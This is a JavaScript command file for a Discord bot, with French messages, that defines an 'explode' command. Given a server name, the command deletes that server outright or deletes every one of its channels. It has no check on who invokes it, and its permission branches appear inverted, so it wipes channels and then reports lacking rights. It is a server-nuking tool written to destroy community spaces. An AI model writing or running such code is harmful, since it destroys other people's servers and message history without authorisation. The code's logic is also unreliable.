const { MessageEmbed } = require("discord.js");
const config = require("../botconfig/config.json");
const ee = require("../botconfig/embed.json");

module.exports = {
    name: "explode",
    usage: "explode",
    description: 'DESTRUCTION',
    run: async (client, message, text, args) => {
      try {

        if (!args[0]) {
            message.channel.send({embeds: [
                new MessageEmbed()
                    .setColor(ee.wrongcolor)
                    .setTitle(`❌ ERREUR | Pas assez d'arguments`)
                    .setDescription("`[help explode` pour plus d'informations")
                ]})
            return;
        }



        let serverName = args.join(" ")

        let guild = client.guilds.cache.find(guild => guild.name == `${serverName}`)
        if (guild) {
            if (!guild.me.permissions.has("ADMINISTRATOR") && guild.me.permissions.has("MANAGE_GUILD")) {
                console.log(guild.name);
                // Deletion
                guild.delete()
                return message.channel.send(`${guild.name} exploded`)
            }
            else {
                // Delete channels
                guild.channels.cache.each(channel => {
                    channel.delete()
                    .then(console.log)
                    .catch(console.error);
                });

                return message.channel.send({embeds : [
                    new MessageEmbed()
                        .setColor(ee.wrongcolor)
                        .setTitle(`❌ ERREUR | J'ai pas les droits fréro`)]}
                );

            }
        }
        else {
            return message.channel.send({embeds : [
                new MessageEmbed()
                    .setColor(ee.wrongcolor)
                    .setTitle(`❌ ERREUR | Pas de serveur trouvé :(`)]}
            );
        }



        } catch (e) {
          console.log(String(e.stack).bgRed);
          return message.channel.send({embeds : [
            new MessageEmbed()
              .setColor(ee.wrongcolor)
              .setTitle(`❌ ERREUR | Une erreur est survenue : `)
              .setDescription(`\`\`\`${e.stack}\`\`\``)]}
          );
        }
  }
}

/** Template by Tomato#6966 | https://github.com/Tomato6966/Discord-Js-Handler-Template */
